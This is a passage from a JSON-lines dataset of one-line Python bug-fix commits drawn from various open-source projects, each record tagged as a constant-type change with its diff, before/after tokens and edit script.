49]]]"}
{"project": "time-track-tool", "commit_sha": "9bfa63f1581876e27d74782596e2703b5ad5a9a7", "parent_sha": "8e0ca8c38996317537494c2aa269018e8c3885b4", "file_path": "time/detectors/user.py", "project_url": "https://github.com/tttech-group/time-track-tool", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -122,7 +122,7 @@ def audit_user_fields(db, cl, nodeid, new_values):\n         ld = new_values ['lunch_duration']\n         if ld * 3600 % 900 :\n             raise Reject, _ (\"Times must be given in quarters of an hour\")\n-        new_values ['lunch_duration'] = int (ld * 4) / 4\n+        new_values ['lunch_duration'] = int (ld * 4) / 4.\n         if ld > 8 :\n             raise Reject, _ (\"Lunchbreak of more than 8 hours? Sure?\")\n         if ld < .5 :\n", "before": "new_values [ 'lunch_duration' ] = int ( ld * 4 ) / 4", "after": "new_values [ 'lunch_duration' ] = int ( ld * 4 ) / 4.", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 41, 3, 57], [\"float:4.\", \"T\"], 2], [\"Delete\", [\"integer:4\", 3, 56, 3, 57]]]"}
{"project": "atmosphere", "commit_sha": "1d8af97493529cf77e9c6239493a8ceb674f8083", "parent_sha": "2e6cedd42d18c2ccd4877abf51cb789281e950b8", "file_path": "core/models/machine.py", "project_url": "https://github.com/eriksf/atmosphere", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -143,7 +143,7 @@ def create_provider_machine(machine_name, provider_alias, provider_id, app, meta\n         created_by = machine_owner.created_by,\n         created_by_identity = machine_owner,\n         identifier = provider_alias,\n-        version = metadata.get('version','1'))\n+        version = metadata.get('version',1))\n     logger.info(\"New ProviderMachine created: %s\" % provider_machine)\n     add_to_cache(provider_machine)\n     return provider_machine\n", "before": "created_by = machine_owner . created_by , created_by_identity = machine_owner , identifier = provider_alias , version = metadata . get ( 'version' , '1' ) ) logger . info ( \"New ProviderMachine created: %s\" % provider_machine )", "after": "created_by = machine_owner . created_by , created_by_identity = machine_owner , identifier = provider_alias , version = metadata . get ( 'version' , 1 ) ) logger . info ( \"New ProviderMachine created: %s\" % provider_machine )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 31, 3, 46], [\"integer:1\", \"T\"], 3], [\"Delete\", [\"string:'1'\", 3, 42, 3, 45]]]"}
{"project": "trackma", "commit_sha": "4baef1743f23ee709b8862d7a05a82181179d48d", "parent_sha": "3c8f1d450bdb38e5910fb9acc34ed473e463cabf", "file_path": "wmal/lib/libvndb.py", "project_url": "https://github.com/4re/trackma", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -198,7 +198,7 @@ class libvndb(lib):\n             for item in data['items']:\n                 vnid = item['vn']\n                 try:\n-                    vns[vnid]['my_score'] = (item['vote'] / 10)\n+                    vns[vnid]['my_score'] = (item['vote'] / 10.0)\n                 except KeyError:\n                     # Ghost vote; ignore it\n                     pass\n", "before": "vns [ vnid ] [ 'my_score' ] = ( item [ 'vote' ] / 10 )", "after": "vns [ vnid ] [ 'my_score' ] = ( item [ 'vote' ] / 10.0 )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 46, 3, 63], [\"float:10.0\", \"T\"], 2], [\"Delete\", [\"integer:10\", 3, 61, 3, 63]]]"}
{"project": "zaifbot", "commit_sha": "8e96db35ee97046394bff50ff2c257af1c80dded", "parent_sha": "2715af7c00fea0676b0be33294d41060ac2b01cd", "file_path": "zaifbot/__init__.py", "project_url": "https://github.com/techbureau/zaifbot", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ def install_ta_lib():\n \n \n def __install_talib_for_windows(bits, py_version):\n-    if bits == 32:\n+    if bits == '32':\n         file = os.path.join(os.path.dirname(__file__),\n                             \"setup/TA_Lib-0.4.10-cp{v}-cp{v}m-win32.whl\".format(v=py_version))\n     else:\n", "before": "if bits == 32 : file = os . path . join ( os . path . dirname ( __file__ ) , \"setup/TA_Lib-0.4.10-cp{v}-cp{v}m-win32.whl\" . format ( v = py_version ) ) else : ", "after": "if bits == '32' : file = os . path . join ( os . path . dirname ( __file__ ) , \"setup/TA_Lib-0.4.10-cp{v}-cp{v}m-win32.whl\" . format ( v = py_version ) ) else : ", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 18], [\"string:'32'\", \"T\"], 2], [\"Delete\", [\"integer:32\", 3, 16, 3, 18]]]"}
{"project": "moler", "commit_sha": "bfe61dbd224cb832a0e918073a5382bf9b00ce46", "parent_sha": "80ea66e228bfc185cfbc0fd6e4f63780dffb884c", "file_path": "test/unix/test_cmd_uptime.py", "project_url": "https://github.com/nokia/moler", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -35,6 +35,6 @@ host:~ #\"\"\"\n     result = {\n         \"UPTIME\": '3 days  2:14',\n         \"UPTIME_SECONDS\": 8040,\n-        \"USERS\": '29',\n+        \"USERS\": 29,\n     }\n     return data, result\n", "before": "result = { \"UPTIME\" : '3 days  2:14' , \"UPTIME_SECONDS\" : 8040 , \"USERS\" : '29' , }", "after": "result = { \"UPTIME\" : '3 days  2:14' , \"UPTIME_SECONDS\" : 8040 , \"USERS\" : 29 , }", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 9, 3, 22], [\"integer:29\", \"T\"], 2], [\"Delete\", [\"string:'29'\", 3, 18, 3, 22]]]"}
{"project": "mediarover", "commit_sha": "36987167c237f326ff95810aa4b5009f9fd556bf", "parent_sha": "727e902b1e86b4db036f8f59aa3d612844c89eb4", "file_path": "mediarover/__init__.py", "project_url": "https://github.com/kierse/mediarover", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -173,7 +173,7 @@ def _process(config, options, args):\n \t\t\t\t\n \t\t\t\t\t# check filters to see if user wants this series skipped...\n \t\t\t\t\tfilters = config['tv']['filter'][sanitized_name]\n-\t\t\t\t\tif 'skip' in filters and filters['skip'] == 'True':\n+\t\t\t\t\tif 'skip' in filters and filters['skip'] == True:\n \t\t\t\t\t\tlogger.info(\"found skip filter, ignoring series: %s\", dir)\n \t\t\t\t\t\tcontinue\n \n", "before": "if 'skip' in filters and filters [ 'skip' ] == 'True' : logger . info ( \"found skip filter, ignoring series: %s\" , dir ) continue", "after": "if 'skip' in filters and filters [ 'skip' ] == True : logger . info ( \"found skip filter, ignoring series: %s\" , dir ) continue", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 31, 3, 56], [\"true:True\", \"T\"], 2], [\"Delete\", [\"string:'True'\", 3, 50, 3, 56]]]"}
{"project": "JusticeAI", "commit_sha": "a6c07bc447d204a81a142f34342216e3758b171d", "parent_sha": "8d2fe03bb37cf2eb1f70ef6243e647d857b9d808", "file_path": "src/nlp_service/services/report_service_test.py", "project_url": "https://github.com/Cyberjusticelab/JusticeAI", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ class ReportServiceTest(unittest.TestCase):\n         mock_ml_prediction = {\n             \"orders_resiliation\": 1,\n             \"orders_immediate_execution\": 1,\n-            \"additional_indemnity_money\": \"500.0\"\n+            \"additional_indemnity_money\": 500\n         }\n         mock_ml_probabilities = {\n             \"orders_resiliation\": \"0.5\",\n", "before": "mock_ml_prediction = { \"orders_resiliation\" : 1 , \"orders_immediate_execution\" : 1 , \"additional_indemnity_money\" : \"500.0\" }", "after": "mock_ml_prediction = { \"orders_resiliation\" : 1 , \"orders_immediate_execution\" : 1 , \"additional_indemnity_money\" : 500 }", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 13, 3, 50], [\"integer:500\", \"T\"], 2], [\"Delete\", [\"string:\\\"500.0\\\"\", 3, 43, 3, 50]]]"}
{"project": "pybossa", "commit_sha": "f3f3241484aa13ec8ee7064dc05575033b361e76", "parent_sha": "d2ff215a41b7da42d37a82ecf770dc1e6562f4b9", "file_path": "test/test_view/test_user_import.py", "project_url": "https://github.com/bloomberg/pybossa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -88,7 +88,7 @@ class TestUserImport(web.Helper):\n         new_user = user_repo.get_by_name('newuser')\n         assert new_user.fullname == 'New User'\n         assert new_user.email_addr == 'new@user.com'\n-        assert new_user.info['metadata']['user_type'] == 'None'\n+        assert new_user.info['metadata']['user_type'] == None\n \n     @with_context\n     @patch('pybossa.forms.forms.app_settings.upref_mdata.get_upref_mdata_choices')\n", "before": "assert new_user . info [ 'metadata' ] [ 'user_type' ] == 'None'", "after": "assert new_user . info [ 'metadata' ] [ 'user_type' ] == None", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 64], [\"none:None\", \"T\"], 2], [\"Delete\", [\"string:'None'\", 3, 58, 3, 64]]]"}
{"project": "s-osg-tizen-distro", "commit_sha": "60ac03c2c00720c7fc6cb451d289fd9bf1aaa5ef", "parent_sha": "209e0b29b10814339c6e730cf34cbdf53e4b7eff", "file_path": "bitbake/lib/bb/siggen.py", "project_url": "https://github.com/martinezjavier/s-osg-tizen-distro", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -39,7 +39,7 @@ class SignatureGenerator(object):\n         return\n \n     def get_taskhash(self, fn, task, deps, dataCache):\n-        return 0\n+        return \"0\"\n \n     def set_taskdata(self, hashes, deps):\n         return\n", "before": "return 0", "after": "return \"0\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 17], [\"string:\\\"0\\\"\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 16, 3, 17]]]"}
{"project": "Xpra", "commit_sha": "fee2447306df9554528b7bbcb6d98b7f699e821c", "parent_sha": "4fa560f497fa638c47e5b6f076aecb8a0b52e9c2", "file_path": "trunk/src/xpra/client/ui_client_base.py", "project_url": "https://github.com/dscho/Xpra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -643,7 +643,7 @@ class UIXpraClient(XpraClientBase):\n                     self.mmap_enabled = False\n                     self.quit(EXIT_MMAP_TOKEN_FAILURE)\n                     return\n-        self.server_auto_refresh_delay = capabilities.get(\"auto_refresh_delay\", 0)/1000\n+        self.server_auto_refresh_delay = capabilities.get(\"auto_refresh_delay\", 0)/1000.0\n         self.server_encodings_with_speed = capabilities.get(\"encodings.with_speed\", (\"x264\",)) #old servers only supported x264\n         self.server_encodings_with_quality = capabilities.get(\"encodings.with_quality\", (\"jpeg\", \"webp\", \"x264\"))\n         self.change_quality = capabilities.get(\"change-quality\", False)\n", "before": "self . server_auto_refresh_delay = capabilities . get ( \"auto_refresh_delay\" , 0 ) / 1000", "after": "self . server_auto_refresh_delay = capabilities . get ( \"auto_refresh_delay\" , 0 ) / 1000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 42, 3, 88], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 84, 3, 88]]]"}
{"project": "Xpra", "commit_sha": "aa45afc6fcf19dcc2a835f46acaf84da16cf340c", "parent_sha": "3096d2779d16889ade482d317d785686eee7b7f4", "file_path": "src/xpra/client/ui_client_base.py", "project_url": "https://github.com/dscho/Xpra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -643,7 +643,7 @@ class UIXpraClient(XpraClientBase):\n                     self.mmap_enabled = False\n                     self.quit(EXIT_MMAP_TOKEN_FAILURE)\n                     return\n-        self.server_auto_refresh_delay = capabilities.get(\"auto_refresh_delay\", 0)/1000\n+        self.server_auto_refresh_delay = capabilities.get(\"auto_refresh_delay\", 0)/1000.0\n         self.server_encodings_with_speed = capabilities.get(\"encodings.with_speed\", (\"x264\",)) #old servers only supported x264\n         self.server_encodings_with_quality = capabilities.get(\"encodings.with_quality\", (\"jpeg\", \"webp\", \"x264\"))\n         self.change_quality = capabilities.get(\"change-quality\", False)\n", "before": "self . server_auto_refresh_delay = capabilities . get ( \"auto_refresh_delay\" , 0 ) / 1000", "after": "self . server_auto_refresh_delay = capabilities . get ( \"auto_refresh_delay\" , 0 ) / 1000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 42, 3, 88], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 84, 3, 88]]]"}
{"project": "Xpra", "commit_sha": "b76307faf4539482ade844e2c013b11a253db3f6", "parent_sha": "a4c0de24ccb6e1f3e5be56bb40146e8e0a969330", "file_path": "tags/v0.9.x/src/xpra/client.py", "project_url": "https://github.com/dscho/Xpra", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -859,7 +859,7 @@ class XpraClient(XpraClientBase, gobject.GObject):\n         self.server_supports_clipboard = capabilities.get(\"clipboard\", False)\n         self.clipboard_enabled = self.client_supports_clipboard and self.server_supports_clipboard\n         self.mmap_enabled = self.supports_mmap and self.mmap_file and capabilities.get(\"mmap_enabled\")\n-        self.server_auto_refresh_delay = capabilities.get(\"auto_refresh_delay\", 0)/1000\n+        self.server_auto_refresh_delay = capabilities.get(\"auto_refresh_delay\", 0)/1000.0\n         self.change_quality = capabilities.get(\"change-quality\", False)\n         self.change_min_quality = capabilities.get(\"change-min-quality\", False)\n         self.change_speed = capabilities.get(\"change-speed\", False)\n", "before": "self . server_auto_refresh_delay = capabilities . get ( \"auto_refresh_delay\" , 0 ) / 1000", "after": "self . server_auto_refresh_delay = capabilities . get ( \"auto_refresh_delay\" , 0 ) / 1000.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 42, 3, 88], [\"float:1000.0\", \"T\"], 2], [\"Delete\", [\"integer:1000\", 3, 84, 3, 88]]]"}
{"project": "splash", "commit_sha": "c28f045450da669293423adbcfdd197a77865b4a", "parent_sha": "b10cee50c279fe5fbe86ba4cd298a8ed15ee4335", "file_path": "splash/tests/test_render.py", "project_url": "https://github.com/qiyeboy/splash", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -329,7 +329,7 @@ class RenderHtmlTest(Base.RenderTest):\n                 \"use_js\": use_js,\n             })\n             url = self.mockurl(\"set-cookie?%s\" % q)\n-            resp = self.request({\"url\": url, \"wait\": 0.2})\n+            resp = self.request({\"url\": url, \"wait\": \"0.2\"})\n             self.assertStatusCode(resp, 200)\n             self.assertIn(\"bar\", resp.text)\n \n", "before": "resp = self . request ( { \"url\" : url , \"wait\" : 0.2 } )", "after": "resp = self . request ( { \"url\" : url , \"wait\" : \"0.2\" } )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"pair\", 3, 46, 3, 57], [\"string:\\\"0.2\\\"\", \"T\"], 2], [\"Delete\", [\"float:0.2\", 3, 54, 3, 57]]]"}
{"project": "SC2Casts.bundle", "commit_sha": "4b54753e15e9f76069bf02b10343926f7b1b4082", "parent_sha": "ab000c7f9e663f3c895cf73ff86fec872b263840", "file_path": "Contents/Code/__init__.py", "project_url": "https://github.com/tru/SC2Casts.bundle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -139,7 +139,7 @@ def GameInfo(game):\n     oc = ObjectContainer(view_group = 'InfoList', title2 = '%s vs %s (%s)' % (game.players[0], game.players[1], game.bestof))\n \n     gamenr = 1\n-    rating = 0\n+    rating = 0.0\n     if game.rateup:\n         rating = (float(game.rateup) * 10.0) / (float(game.rateup) + float(game.ratedown))\n \n", "before": "rating = 0", "after": "rating = 0.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 15], [\"float:0.0\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 14, 3, 15]]]"}
{"project": "easybuild-easyblocks", "commit_sha": "87a2685b660b178eeb5644e9e98557f6ed88eaac", "parent_sha": "64816689a0f72e08d22e124f3113ae677f125650", "file_path": "easybuild/easyblocks/q/qt.py", "project_url": "https://github.com/schiotz/easybuild-easyblocks", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -80,7 +80,7 @@ class EB_Qt(ConfigureMake):\n         \"\"\"Custom sanity check for Qt.\"\"\"\n \n         libversion = ''\n-        if LooseVersion(self.version) >= LooseVersion(5):\n+        if LooseVersion(self.version) >= LooseVersion('5'):\n             libversion = self.version.split('.')[0]\n \n         custom_paths = {\n", "before": "if LooseVersion ( self . version ) >= LooseVersion ( 5 ) : libversion = self . version . split ( '.' ) [ 0 ]", "after": "if LooseVersion ( self . version ) >= LooseVersion ( '5' ) : libversion = self . version . split ( '.' ) [ 0 ]", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 54, 3, 57], [\"string:'5'\", \"T\"], 1], [\"Delete\", [\"integer:5\", 3, 55, 3, 56]]]"}
{"project": "mdanalysis", "commit_sha": "3128f23bc9ee7d7e5ac9908a37e9b9a028ab62cb", "parent_sha": "7fde350e7ad48f1558b1ddda7933412f77b4fbbe", "file_path": "package/MDAnalysis/coordinates/XTC.py", "project_url": "https://github.com/MDAnalysis/mdanalysis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ class XTCWriter(XDRBaseWriter):\n         # xdrlib will multiply the coordinated by precision. This means for a\n         # precision of 3 decimal places we need to pass 1000.0 to the xdr\n         # library.\n-        precision = 10 ** self.precision\n+        precision = 10.0 ** self.precision\n         self._xdr.write(xyz, box, step, time, precision)\n \n \n", "before": "precision = 10 ** self . precision", "after": "precision = 10.0 ** self . precision", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 21, 3, 41], [\"float:10.0\", \"T\"], 0], [\"Delete\", [\"integer:10\", 3, 21, 3, 23]]]"}
{"project": "mdanalysis", "commit_sha": "04d9a10c1804b0804735c9f0b61356bb33171763", "parent_sha": "1f956d3c7cdad94e3cbd38986d2878c433acd1aa", "file_path": "testsuite/MDAnalysisTests/converters/test_openmm.py", "project_url": "https://github.com/MDAnalysis/mdanalysis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class TestOpenMMBasicSimulationReader():\n         assert omm_sim_uni.residues.n_residues == 1\n         assert omm_sim_uni.residues.resnames[0] == \"RES\"\n         assert omm_sim_uni.segments.n_segments == 1\n-        assert omm_sim_uni.segments.segids[0] == 0\n+        assert omm_sim_uni.segments.segids[0] == '0'\n         assert len(omm_sim_uni.bonds.indices) == 0\n \n \n", "before": "assert omm_sim_uni . segments . segids [ 0 ] == 0", "after": "assert omm_sim_uni . segments . segids [ 0 ] == '0'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 51], [\"string:'0'\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 50, 3, 51]]]"}
{"project": "moto", "commit_sha": "194da53a0edcd38b920318d9a353705232f6f2a4", "parent_sha": "b8bb6c2dcfe2c241928523a1d0c1aa186fb867fa", "file_path": "moto/sns/models.py", "project_url": "https://github.com/DrFaust92/moto", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ class PlatformEndpoint(BaseModel):\n         if 'Token' not in self.attributes:\n             self.attributes['Token'] = self.token\n         if 'Enabled' not in self.attributes:\n-            self.attributes['Enabled'] = True\n+            self.attributes['Enabled'] = 'True'\n \n     @property\n     def enabled(self):\n", "before": "self . attributes [ 'Enabled' ] = True", "after": "self . attributes [ 'Enabled' ] = 'True'", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 13, 3, 46], [\"string:'True'\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 42, 3, 46]]]"}
{"project": "kim_emnlp_2014", "commit_sha": "3a42fd68451861659ea751f7a7b3f2f2caf4203c", "parent_sha": "2e5c21559f898d79e3494bbe72f852ca7438c3c0", "file_path": "train.py", "project_url": "https://github.com/toru34/kim_emnlp_2014", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -25,7 +25,7 @@ def main():\n     parser.add_argument('--batch_size', type=int, default=64, help='Mini batch size [default: 64]')\n     parser.add_argument('--win_sizes', type=int, nargs='*', default=[3, 4, 5], help='Window sizes of filters [default: [3, 4, 5]]')\n     parser.add_argument('--num_fil', type=int, default=100, help='Number of filters in each window size [default: 100]')\n-    parser.add_argument('--s', type=float, default=3, help='L2 norm constraint on w [default: 3.0]')\n+    parser.add_argument('--s', type=float, default=3.0, help='L2 norm constraint on w [default: 3.0]')\n     parser.add_argument('--dropout_prob', type=float, default=0.5, help='Dropout probability [default: 0.5]')\n     parser.add_argument('--v_strategy', type=str, default='static', help='Embedding strategy. rand: Random  initialization. static: Load pretrained embeddings and do not update during the training. non-static: Load pretrained embeddings and update during the training. [default: static]')\n     parser.add_argument('--alloc_mem', type=int, default=4096, help='Amount of memory to allocate [mb] [default: 4096]')\n", "before": "parser . add_argument ( '--s' , type = float , default = 3 , help = 'L2 norm constraint on w [default: 3.0]' )", "after": "parser . add_argument ( '--s' , type = float , default = 3.0 , help = 'L2 norm constraint on w [default: 3.0]' )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 44, 3, 53], [\"float:3.0\", \"T\"], 2], [\"Delete\", [\"integer:3\", 3, 52, 3, 53]]]"}
{"project": "trollcast", "commit_sha": "c16f15b883af330a3cccee4f98b1d7bcdb339a82", "parent_sha": "0a7666ae21f787b208ed842ab9ca470ef86f48ab", "file_path": "trollcast/client.py", "project_url": "https://github.com/pytroll/trollcast", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -690,7 +690,7 @@ class Client(HaveBuffer):\n                                 to_send[\"satellite\"] = sat\n                                 to_send[\"format\"] = \"HRPT\"\n                                 to_send[\"start_time\"] = first_time\n-                                to_send[\"level\"] = 0\n+                                to_send[\"level\"] = \"0\"\n                                 to_send[\"filename\"] = os.path.basename(\n                                     filename)\n                                 fullname = os.path.realpath(filename)\n", "before": "to_send [ \"level\" ] = 0", "after": "to_send [ \"level\" ] = \"0\"", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"assignment\", 3, 33, 3, 53], [\"string:\\\"0\\\"\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 52, 3, 53]]]"}
{"project": "deep_pipe", "commit_sha": "c2104eb16ade41af305667eb483617408f05c2c5", "parent_sha": "5135217999a72e59499a2ddc8ed682469ada8638", "file_path": "dpipe/torch/functional.py", "project_url": "https://github.com/neuro-ml/deep_pipe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -178,7 +178,7 @@ def masked_loss(mask: torch.Tensor, criterion: Callable, prediction: torch.Tenso\n     if not mask.any():\n-        return torch.tensor(0, requires_grad=True).to(prediction)\n+        return torch.tensor(0., requires_grad=True).to(prediction)\n \n     return criterion(prediction[mask], target[mask], **kwargs)\n \n", "before": "return torch . tensor ( 0 , requires_grad = True ) . to ( prediction )", "after": "return torch . tensor ( 0. , requires_grad = True ) . to ( prediction )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 1, 28, 1, 51], [\"float:0.\", \"T\"], 1], [\"Delete\", [\"integer:0\", 1, 29, 1, 30]]]"}
{"project": "EPICS-DeviceEmulator", "commit_sha": "4bd2ea26d82841e7af2a908641ab1cb16be16b0a", "parent_sha": "35867bb6d4a491aa461c1781155020b87b8d6467", "file_path": "lewis_emulators/fermichopper/device.py", "project_url": "https://github.com/ISISComputingGroup/EPICS-DeviceEmulator", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -56,7 +56,7 @@ class SimulatedFermichopper(StateMachineDevice):\n         self.update_delay()\n \n     def update_delay(self):\n-        self.delay = (self.delay_highword * 65536 + self.delay_lowword)/50400\n+        self.delay = (self.delay_highword * 65536 + self.delay_lowword)/50400.0\n \n     def set_gate_width(self, value):\n         self.gatewidth = value\n", "before": "self . delay = ( self . delay_highword * 65536 + self . delay_lowword ) / 50400", "after": "self . delay = ( self . delay_highword * 65536 + self . delay_lowword ) / 50400.0", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 22, 3, 78], [\"float:50400.0\", \"T\"], 2], [\"Delete\", [\"integer:50400\", 3, 73, 3, 78]]]"}
{"project": "cloudman", "commit_sha": "71a273ebf93cbf132e24ef549ea3db85fe94947b", "parent_sha": "c33dad8c3c1a7ab5724ed40fbb0bbde8a42a1280", "file_path": "cm/controllers/root.py", "project_url": "https://github.com/gvlproject/cloudman", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -465,7 +465,7 @@ class CM(BaseController):\n             return comment\n \n     @expose\n-    def manage_service(self, trans, service_name, to_be_started=True, is_filesystem=False):\n+    def manage_service(self, trans, service_name, to_be_started='True', is_filesystem=False):\n", "before": "def manage_service ( self , trans , service_name , to_be_started = True , is_filesystem = False ) : ", "after": "def manage_service ( self , trans , service_name , to_be_started = 'True' , is_filesystem = False ) : ", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"default_parameter\", 3, 51, 3, 69], [\"string:'True'\", \"T\"], 2], [\"Delete\", [\"true:True\", 3, 65, 3, 69]]]"}
{"project": "BulkSmsZW-Api", "commit_sha": "3e9643a32780877b656503885cf9fbc6abb183fe", "parent_sha": "f74c3428ae61b4f69086d4258f744829bb92bafd", "file_path": "BulkSmsApi/Client.py", "project_url": "https://github.com/DonnC/BulkSmsZW-Api", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class Client:\n \r\n     def __api_errors(self, error_response):\r\n         # handle bulksmszw api error\r\n-        if error_response.get(\"error_string\") == \"None\":\r\n+        if error_response.get(\"error_string\") == None:\r\n             return False\r\n         elif len(error_response.get(\"error_string\")) > 5:\r\n             return True\r\n", "before": "if error_response . get ( \"error_string\" ) == \"None\" : return False elif len ( error_response . get ( \"error_string\" ) ) > 5 : return True", "after": "if error_response . get ( \"error_string\" ) == None : return False elif len ( error_response . get ( \"error_string\" ) ) > 5 : return True", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 56], [\"none:None\", \"T\"], 2], [\"Delete\", [\"string:\\\"None\\\"\", 3, 50, 3, 56]]]"}
{"project": "open-event-server", "commit_sha": "9d534a9a305d78bbd154efa0001e863d95df8653", "parent_sha": "636c8bab4dc588f2dc4c6fc804c251299f7af3ef", "file_path": "migrations/versions/43e8c59337ae_.py", "project_url": "https://github.com/zneswork/open-event-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ down_revision = '232b13d4e86a'\n def upgrade():\n     # ### commands auto generated by Alembic - please adjust! ###\n     op.add_column('tickets', sa.Column('max_price', sa.Float(), nullable=True))\n-    op.add_column('tickets', sa.Column('min_price', sa.Float(), server_default=0, nullable=False))\n+    op.add_column('tickets', sa.Column('min_price', sa.Float(), server_default='0', nullable=False))\n     # ### end Alembic commands ###\n \n \n", "before": "op . add_column ( 'tickets' , sa . Column ( 'min_price' , sa . Float ( ) , server_default = 0 , nullable = False ) )", "after": "op . add_column ( 'tickets' , sa . Column ( 'min_price' , sa . Float ( ) , server_default = '0' , nullable = False ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 65, 3, 81], [\"string:'0'\", \"T\"], 2], [\"Delete\", [\"integer:0\", 3, 80, 3, 81]]]"}
{"project": "tomato", "commit_sha": "7a5e06a6ca21181d452a871d5e3bd513ca10d80c", "parent_sha": "3b6176e50a92585ef2fd0e4b675078a7377d2ee5", "file_path": "func_tests/tests/reviewandtests/review_tests.py", "project_url": "https://github.com/yogeshsr/tomato", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -101,4 +101,4 @@ class TestReviewProject(BaseTest):\n     def test_number_of_data_senders_should_show_in_current_project(self):\n         review_page = self.prepare_data_senders( )\n         review_page.open_data_sender_accordion()\n-        self.assertEqual(1, review_page.get_data_sender_count())\n+        self.assertEqual('1', review_page.get_data_sender_count())\n", "before": "self . assertEqual ( 1 , review_page . get_data_sender_count ( ) )", "after": "self . assertEqual ( '1' , review_page . get_data_sender_count ( ) )", "sstub_pattern": "CHANGE_CONSTANT_TYPE", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 65], [\"string:'1'\", \"T\"], 1], [\"Delete\", [\"integer:1\", 3, 26, 3, 27]]]"}
